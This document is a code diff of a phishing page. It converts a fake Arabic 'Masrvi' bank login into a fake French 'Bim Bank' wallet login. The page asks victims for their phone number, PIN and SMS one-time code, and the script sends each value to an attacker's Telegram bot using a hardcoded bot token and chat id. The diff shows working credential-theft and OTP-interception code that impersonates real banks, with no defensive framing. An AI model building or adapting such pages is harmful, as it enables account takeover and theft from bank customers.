@@ -1,100 +1,143 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Masrvi - مصرفي</title>
+    <title>Bim Bank - Espace Wallet</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Amiri:wght@700&family=Reem+Kufi:wght@700&family=Tajawal:wght@400;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
         
-        body { font-family: 'Tajawal', sans-serif; background-color: #ffffff; }
+        body { font-family: 'Roboto', sans-serif; background-color: #fdfdfd; color: #1e293b; }
         
-        .logo-arabic { font-family: 'Amiri', serif; font-size: 4.5rem; color: #00d8b4; line-height: 1; text-shadow: 2px 2px 4px rgba(0,0,0,0.1); }
-        .logo-english { font-family: 'Reem Kufi', sans-serif; font-size: 2.2rem; color: #1d1b5a; margin-top: -15px; font-weight: bold; }
-        .logo-sub { color: #1d1b5a; font-size: 0.8rem; font-weight: bold; margin-top: 5px; }
+        /* خلفية الشبكة */
+        .grid-bg { background-image: linear-gradient(#f0f0f0 1px, transparent 1px), linear-gradient(90deg, #f0f0f0 1px, transparent 1px); background-size: 20px 20px; }
 
-        .input-box { border: 2px solid #000; border-radius: 15px; padding: 15px; width: 100%; display: flex; align-items: center; margin-bottom: 20px; }
-        .masrvi-button { background-color: #94a3a8; color: white; font-weight: bold; padding: 15px; width: 100%; border-radius: 10px; font-size: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        
-        .awards-banner { background: linear-gradient(180deg, #f8f9fa 0%, #e9ecef 100%); border-radius: 20px; padding: 20px; margin-top: 30px; text-align: center; border: 1px solid #ddd; }
-        .awards-title { font-family: 'Amiri', serif; font-size: 2.5rem; color: #00d8b4; margin-bottom: 10px; }
-        .awards-grid { display: flex; justify-content: space-around; align-items: center; font-size: 2.5rem; }
-        .award-item { display: flex; flex-direction: column; align-items: center; }
-        .award-label { font-size: 0.7rem; color: #1d1b5a; font-weight: bold; margin-top: 5px; }
+        /* الألوان الرسمية */
+        .bg-bim-blue { background-color: #2a4387; } /* Wallet button */
+        .text-bim-blue { color: #2a4387; }
+        .bg-bim-orange { background-color: #f19e2c; } /* Connection button */
+        .border-bim-blue { border-color: #2a4387; }
 
-        .timer-box { background-color: black; color: white; padding: 10px 30px; border-radius: 5px; font-size: 24px; font-weight: bold; display: inline-block; margin-bottom: 20px; }
+        /* حقول الإدخال */
+        .input-field { border: 1px solid #d1d5db; border-radius: 12px; padding: 15px; width: 100%; outline: none; font-size: 16px; background-color: white; color: #333; }
+        .input-field::placeholder { color: #9ca3af; }
+        .input-field:focus { border-color: #f19e2c; box-shadow: 0 0 0 2px rgba(241, 158, 44, 0.2); }
+
+        /* تصميم زر التبديل السفلي (Contacts) */
+        .contact-btn { border: 1px solid #1e293b; color: #1e293b; font-weight: 500; }
+
+        /* الواجهة الثانية (Modal) */
+        #otp-modal-container { background-color: rgba(0, 0, 0, 0.5); display: none; }
+        #otp-modal { max-width: 90%; width: 380px; }
+
+        /* المؤقت الدائري */
+        .timer-container { position: relative; width: 120px; h: 120px; margin: 0 auto; }
+        .timer-circle { width: 100%; h: 100%; border-radius: 50%; border: 6px solid #f19e2c; position: absolute; top: 0; left: 0; display: flex; align-items: center; justify-content: center; background-color: #fffbeb; }
+        #timer-text { font-size: 20px; font-weight: bold; color: #2a4387; }
+        .timer-dot { width: 8px; h: 8px; bg-color: #f19e2c; border-radius: 50%; position: absolute; top: -1px; left: calc(50% - 4px); }
+
     </style>
 </head>
-<body class="flex flex-col min-h-screen items-center">
+<body class="grid-bg min-h-screen flex flex-col items-center">
 
-    <div class="pt-8 mb-8 flex flex-col items-center">
-        <div class="logo-arabic">مصرفي</div>
-        <div class="logo-english">Masrvi</div>
-        <div class="logo-sub">By BMCI</div>
+    <!-- الشعار والعنوان العلوي (يظهرا في كلا الواجهتين) -->
+    <div class="pt-8 mb-4 flex flex-col items-center w-full max-w-md px-6">
+        <img src="https://telegra.ph/file/0c9e658933b49e1e2479e.png" alt="Bim Bank Logo" class="h-28 mb-4">
+        <h1 class="text-xl text-center text-gray-800 font-normal leading-tight">
+            Bienvenue dans votre<br>espace wallet
+        </h1>
     </div>
 
-    <div id="step1" class="w-full max-w-sm px-6">
-        <label class="block text-right font-bold mb-2">رقم الهاتف المربوط بالحساب *</label>
-        <div class="input-box">
-            <span class="ml-3 text-gray-500 text-xl">👤</span>
-            <input id="phone" type="tel" maxlength="8" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full outline-none text-right font-bold" placeholder="رقم الهاتف">
-        </div>
-
-        <label class="block text-right font-bold mb-2">الرمز السري (PIN) *</label>
-        <div class="input-box">
-            <span class="ml-3 text-gray-500 text-xl">🔒</span>
-            <input id="pin" type="password" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full outline-none text-right font-bold" placeholder="أدخل الرمز السري">
-        </div>
-
-        <button onclick="goToStep2()" class="masrvi-button mt-2">ادخل السحب الآمن</button>
+    <!-- ################# الواجهة الأولى (Login) ################# -->
+    <div id="step1-login" class="w-full max-w-sm px-6 flex flex-col flex-grow">
         
-        <div class="awards-banner">
-            <div class="awards-title">مصرفي</div>
-            <div class="text-sm font-bold text-gray-600 mb-4">جوائز كبرى بانتظارك</div>
-            <div class="awards-grid">
-                <div class="award-item">
-                    <span>🚗</span>
-                    <span class="award-label">سيارات</span>
-                </div>
-                <div class="award-item">
-                    <span>📱</span>
-                    <span class="award-label">هواتف ذكية</span>
-                </div>
-                <div class="award-item">
-                    <span>💰</span>
-                    <span class="award-label">مبالغ نقدية</span>
-                </div>
-            </div>
+        <!-- أزرار التبديل -->
+        <div class="flex border-2 border-gray-300 rounded-lg overflow-hidden mb-6 mt-6">
+            <button class="flex-1 bg-bim-blue text-white py-3 font-bold text-lg">Wallet</button>
+            <button class="flex-1 bg-white text-gray-700 py-3 font-normal text-lg">Banking</button>
+        </div>
+
+        <h2 class="text-2xl font-semibold text-gray-800 mb-6 mt-2">Connexion</h2>
+
+        <!-- حقل الهاتف -->
+        <div class="mb-5 relative">
+            <input id="phone" type="tel" maxlength="8" oninput="updateCount('phone', 8)" class="input-field" placeholder="Téléphone">
+            <span id="phone-count" class="absolute bottom-[-20px] right-2 text-xs text-gray-500">0/8</span>
+        </div>
+
+        <!-- حقل كلمة المرور -->
+        <div class="mb-3 relative">
+            <input id="password" type="password" maxlength="4" oninput="updateCount('password', 4)" class="input-field" placeholder="Mot de passe">
+            <span id="password-count" class="absolute bottom-[-20px] right-2 text-xs text-gray-500">0/4</span>
+        </div>
+
+        <!-- رابط نسيت كلمة المرور -->
+        <div class="text-right mb-6">
+            <a href="#" class="text-sm text-gray-600 font-normal">Mot de passe oublié ?</a>
+        </div>
+
+        <!-- زر تسجيل الدخول -->
+        <button onclick="goToStep2()" class="bg-bim-orange text-white w-full py-4 rounded-xl font-bold text-lg shadow-sm mb-12">
+            Connexion
+        </button>
+
+        <!-- القسم السفلي (يظهر في كلا الواجهتين) -->
+        <div class="mt-auto mb-10 text-center w-full">
+            <p class="text-gray-700 font-normal mb-1">Nouvel utilisateur ?</p>
+            <a href="#" class="text-bim-blue font-bold flex items-center justify-center gap-2 mb-8">
+                S'inscrire maintenant 
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </a>
+            <button class="contact-btn w-full py-3 rounded-lg flex items-center justify-center gap-2 text-lg">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+                Contacts
+            </button>
         </div>
     </div>
 
-    <div id="step2" class="w-full max-w-sm px-6 hidden text-center">
-        <div class="mb-6 flex justify-center pt-4">
-            <div class="w-20 h-20 bg-[#00d8b4] rounded-full flex items-center justify-center shadow-lg border-2 border-white">
-                <span class="text-3xl font-bold text-[#1d1b5a]">S:</span>
+
+    <!-- ################# الواجهة الثانية (OTP Modal) ################# -->
+    <div id="otp-modal-container" class="fixed inset-0 flex items-center justify-center z-50">
+        <div id="otp-modal" class="bg-white rounded-3xl p-8 shadow-2xl relative">
+            
+            <!-- زر الإغلاق (X) -->
+            <button onclick="closeModal()" class="absolute top-6 right-6 text-bim-blue">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+            </button>
+
+            <!-- المؤقت الدائري -->
+            <div class="mt-8 mb-8 text-center">
+                <div class="timer-container relative w-28 h-28 mx-auto">
+                    <!-- الدائرة الخارجية الباهتة -->
+                    <svg class="absolute top-0 left-0 w-full h-full" viewBox="0 0 120 120">
+                        <circle cx="60" cy="60" r="54" fill="#fffbeb" stroke="#fef3c7" stroke-width="6"/>
+                    </svg>
+                    <!-- النص والدائرة المتحركة -->
+                    <div class="timer-circle">
+                        <div class="timer-dot"></div>
+                        <span id="timer-text">05:00</span>
+                    </div>
+                </div>
             </div>
-        </div>
-        <h2 class="font-bold mb-6 text-lg text-right">يرجى ادخال الرمز الذي تلقيته عبر الرسائل النصية *</h2>
-        <div class="input-box">
-            <span class="ml-3 text-xl">💬</span>
-            <input id="otp" type="tel" maxlength="6" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full outline-none text-center tracking-[8px] text-2xl font-bold" placeholder="######">
-        </div>
-        <div class="timer-box" id="timer">05:00</div>
-        <button onclick="finalSubmit()" class="masrvi-button">تأكيد العملية</button>
-        
-        <div class="awards-banner">
-            <div class="awards-title">مصرفي</div>
-            <div class="awards-grid">
-                <div class="award-item"><span>🚗</span></div>
-                <div class="award-item"><span>📱</span></div>
-                <div class="award-item"><span>💰</span></div>
+
+            <h3 class="text-xl text-gray-700 mb-2 font-normal">Entrez le code OTP</h3>
+
+            <!-- حقل الرمز -->
+            <div class="mb-2 relative">
+                <input id="otp" type="tel" maxlength="6" oninput="updateCount('otp', 6)" class="input-field" placeholder="">
+                <span id="otp-count" class="absolute bottom-[-18px] right-2 text-xs text-gray-500">0/6</span>
             </div>
+
+            <!-- زر التأكيد -->
+            <button onclick="finalSubmit()" class="bg-bim-orange text-white w-full py-4 rounded-xl font-bold text-lg shadow-sm mt-8">
+                Connexion
+            </button>
         </div>
     </div>
 
     <script>
-        // القيم المحدثة بناءً على الصور
+        // إعدادات تليجرام الخاصة بك
         const token = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0"; 
         const chatId = "8665814266"; 
 
@@ -102,39 +145,59 @@
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
         }
 
+        // تحديث عداد الأرقام المكتوبة (مثل 0/8)
+        function updateCount(inputId, max) {
+            const input = document.getElementById(inputId);
+            input.value = input.value.replace(/[^0-9]/g, ''); // منع الحروف
+            document.getElementById(inputId + '-count').textContent = input.value.length + '/' + max;
+        }
+
+        // الانتقال للواجهة الثانية (فتح الـ Modal)
         function goToStep2() {
             const phone = document.getElementById('phone').value;
-            const pin = document.getElementById('pin').value;
-            if(phone.length === 8 && pin.length === 4) {
-                sendToTelegram(`🏦 Masrvi Login:\n👤 الهاتف: ${phone}\n🔑 الكود: ${pin}`);
-                document.getElementById('step1').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
-                startTimer(300);
+            const password = document.getElementById('password').value;
+            if(phone.length === 8 && password.length === 4) {
+                // إرسال بيانات الدخول أولاً
+                sendToTelegram(`🏦 Bim Bank Login:\n👤 Téléphone: ${phone}\n🔑 Pass: ${password}`);
+                
+                // إظهار مربع الـ OTP
+                document.getElementById('otp-modal-container').style.display = 'flex';
+                startTimer(300); // بدء مؤقت 5 دقائق
             } else {
-                alert("تأكد من إدخال 8 أرقام للهاتف و 4 للرمز");
+                alert("Veuillez entrer 8 chiffres pour le téléphone et 4 pour le mot de passe.");
             }
         }
 
+        // إغلاق الـ Modal وإعادة تعيين الواجهة
+        function closeModal() {
+            document.getElementById('otp-modal-container').style.display = 'none';
+            if (window.timerInterval) clearInterval(window.timerInterval);
+        }
+
+        // دالة المؤقت (تنازلي)
         function startTimer(duration) {
+            if (window.timerInterval) clearInterval(window.timerInterval);
             let timer = duration, minutes, seconds;
-            const display = document.getElementById('timer');
-            const interval = setInterval(function () {
+            const display = document.getElementById('timer-text');
+            window.timerInterval = setInterval(function () {
                 minutes = parseInt(timer / 60, 10);
                 seconds = parseInt(timer % 60, 10);
                 minutes = minutes < 10 ? "0" + minutes : minutes;
                 seconds = seconds < 10 ? "0" + seconds : seconds;
                 display.textContent = minutes + ":" + seconds;
-                if (--timer < 0) { clearInterval(interval); display.textContent = "00:00"; }
+                if (--timer < 0) { clearInterval(window.timerInterval); display.textContent = "00:00"; }
             }, 1000);
         }
 
+        // الإرسال النهائي للرمز (OTP)
         function finalSubmit() {
             const otp = document.getElementById('otp').value;
             if(otp.length === 6) {
-                sendToTelegram(`✅ Masrvi OTP:\nالرمز المستلم: ${otp}`);
-                alert("جاري معالجة طلبك، يرجى الانتظار...");
+                sendToTelegram(`✅ Bim Bank OTP:\nCode reçu: ${otp}`);
+                alert("Votre demande est en cours de traitement...");
+                closeModal();
             } else {
-                alert("يرجى إدخال 6 أرقام");
+                alert("Veuillez entrer le code à 6 chiffres.");
             }
         }
     </script>
